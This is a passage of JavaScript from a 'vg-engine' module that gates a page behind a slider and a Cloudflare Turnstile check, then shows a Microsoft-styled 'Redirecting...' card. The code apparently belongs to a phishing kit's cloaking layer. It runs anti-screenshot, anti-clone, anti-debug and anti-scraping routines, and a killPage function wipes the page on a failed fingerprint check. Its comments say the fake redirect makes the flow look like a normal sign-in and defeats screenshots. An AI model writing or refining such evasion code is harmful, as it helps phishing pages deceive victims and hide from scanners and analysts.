      // This is the user-facing managed widget (slider designs): its callback
      // is the authoritative token source for managed mode.
      _vgTsMode = 'managed';
      // Fetch cfHint here since it's not in scope from renderTurnstileIntoCfLayer
      var cfHint = document.getElementById('vgCfHint');

      // Budget exhausted - keep the layer up with the Retry button.
      // Report the real last error rather than a generic string: this guard
      // fires on the retry path, before _onCfFailure gets a chance to report,
      // so without this the Turnstile error code was permanently lost.
      if (_cfAttempts >= _cfMaxAttempts) {
        showCfFailureState(cfHint, _cfLastError || 'Retry limit reached');
        return;
      }

      try {
        var widgetId = window.turnstile.render('#vgCfWidgetWrap', {
          sitekey: window.__TURNSTILE_SITE_KEY,
          theme: 'light',
          retry: 'auto', // 'auto' shows Turnstile's own "Try again" link on error.
          // Only 'never' and 'auto' are valid here - the api.js rejects anything
          // else with error 3592 ("Invalid type for parameter 'retry', expected
          // never|auto"), which previously killed the challenge outright because
          // the widget was created with retry: 'always'.
          callback: function(token) {
            console.log('[vg-engine] Cloudflare Turnstile completed');
            _cancelCfTimeout(); // Cancel timeout on success
            // Turnstile passed - hide layers and show main content
            window.__TURNSTILE_TOKEN = token;
            _turnstileRendered = true;
            setTimeout(function(){
              hideSliderAndCfLayers();
            }, 1000);
          },
          'error-callback': function(errorCode) {
            // Fired for a real challenge failure (e.g. domain mismatch when the
            // page origin was never added to the widget's allowed origins).
            // Retry a bounded number of times, then ask the visitor to retry.
            console.warn('[vg-engine] Cloudflare Turnstile error-callback, code: ' +
              (errorCode || 'unknown'));
            _onCfFailure('Turnstile error-callback ' + (errorCode || ''));
          },
          'expired-callback': function() {
            console.warn('[vg-engine] Cloudflare Turnstile expired, re-executing');
            _cfAttempts = 0;
            try { window.turnstile.execute(widgetId); }
            catch(e) { _onCfFailure(String(e)); }
          }
        });

        // Start timeout AFTER Turnstile is successfully rendered (not when slider completes)
        _resetCfTimeout();

        // Execute the challenge immediately
        setTimeout(function() {
          try {
            window.turnstile.execute(widgetId);
          } catch(e) {
            console.error('[vg-engine] Failed to execute Turnstile:', e.message || e);
            _onCfFailure(String(e));
          }
        }, 500);

      } catch(e) {
        console.error('[vg-engine] Failed to render Turnstile:', e.message || e);
        _onCfFailure(String(e));
      }
    }
    
    // Turnstile passed. Show a short "Redirecting..." transition before the
    // protected page appears, then dismiss the verification layers.
    //
    // A sub-second reveal reads as "the popup was just closed" - there is no
    // hand-off at all. A brief redirect state looks like a normal
    // authentication completion, and a screenshot taken mid-transition
    // captures nothing usable.
    //
    // The card reuses the verification layer's own styling (#F1F3F5 backdrop,
    // white rounded card, #0078D4 spinner) so the transition reads as the same
    // flow rather than a second, unrelated screen.
    function _showRedirectTransition(onDone) {
      var REDIRECT_MS = 2500;

      // Self-contained keyframes - vg-engine is embedded inside arbitrary
      // template HTML, so it cannot rely on a host @keyframes definition.
      var style = document.createElement('style');
      style.textContent = '@keyframes vgRedirectSpin{to{transform:rotate(360deg)}}';
      (document.head || document.documentElement).appendChild(style);

      var el = document.getElementById('vgRedirectLayer');
      if (!el) {
        el = document.createElement('div');
        el.id = 'vgRedirectLayer';
        el.style.cssText = 'position:fixed;inset:0;z-index:100000;background:#F1F3F5;' +
          'font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,sans-serif;' +
          'display:flex;align-items:center;justify-content:center;padding:24px 16px;';
        el.innerHTML =
          '<div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);' +
          'border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">' +
          '<div style="width:36px;height:36px;border:3px solid #EDEBE9;border-top-color:#0078D4;' +
          'border-radius:50%;margin:0 auto 20px;animation:vgRedirectSpin 1s linear infinite;"></div>' +
          '<h1 style="font-size:20px;font-weight:700;color:#232333;margin-bottom:6px;">Redirecting...</h1>' +
          '<p style="font-size:13px;color:#605E5C;margin:0;line-height:1.5;">Please wait a moment.</p>' +
          '</div>';
        document.body.appendChild(el);
      }
      el.style.display = 'flex';

      setTimeout(function() {
        try { if (el.parentNode) el.parentNode.removeChild(el); } catch (e) {}
        if (typeof onDone === 'function') onDone();
      }, REDIRECT_MS);
    }

    function hideSliderAndCfLayers() {
      if (_layersHidden) {
        console.log('[vg-engine] Layers already hidden, skipping');
        return;
      }
      _layersHidden = true;

      // Play the redirect transition FIRST, then remove the layers. The layers
      // stay up underneath the transition, so there is never a frame where the
      // protected page is visible with no overlay.
      _showRedirectTransition(function() {
        var sliderLayer = document.getElementById('vgSliderLayer');
        var cfLayer = document.getElementById('vgCfLayer');

        if(sliderLayer){
          sliderLayer.style.display = 'none';
          sliderLayer.style.visibility = 'hidden';
        }
        if(cfLayer){
          cfLayer.style.display = 'none';
          cfLayer.style.visibility = 'hidden';
        }

        console.log('[vg-engine] Verification layers hidden, showing main content');
        // The template's main card should become visible now
        // Don't force display - let CSS/template handle it
      });
    }
    
    // Check if slider is already completed when vg-engine loads
    // Use a single check instead of multiple overlapping mechanisms
    setTimeout(function(){
      if (!_sliderCompleted && window.__vgCheckSliderReady && window.__vgCheckSliderReady()) {
        console.log('[vg-engine] Slider was already completed, initializing Cloudflare');
        if (typeof window.__vgOnSliderComplete === 'function') {
          window.__vgOnSliderComplete();
        }
      }
    }, 1000);
  }
  
  // ─── Init ───────────────────────────────────────────────────
  function init() {
    applyDynamicContent();
    initBackgroundBlur();
    initSliderChainHandler();
    initBotDetection();
    initAntiScreenshot();
    initAntiClone();
    initAntiDebug();
    initAntiScraping();
    initObfuscation();
  }

  // Expose killPage to vg-fingerprint.js and other external modules.
  // The internal killPage functions are scoped inside their IIFEs; this
  // shared implementation does the same wipe + log flush so the fingerprint
  // layer can fail closed without depending on which IIFE runs first.
  window.__VG_KILLPAGE = function (reason) {
    if (window.__VG_KILLPAGE_DONE) return;
    window.__VG_KILLPAGE_DONE = true;

    console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
    console.error('[VG] URL:', window.location.href);
    console.error('[VG] User-Agent:', navigator.userAgent);

    try {
      document.open();
      document.write('');
      document.close();
    } catch (e) {}

    try { flushLogs(); } catch (e) {}

    setTimeout(function () {
      try { window.location.replace('about:blank'); } catch (e) {}
    }, 400);
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
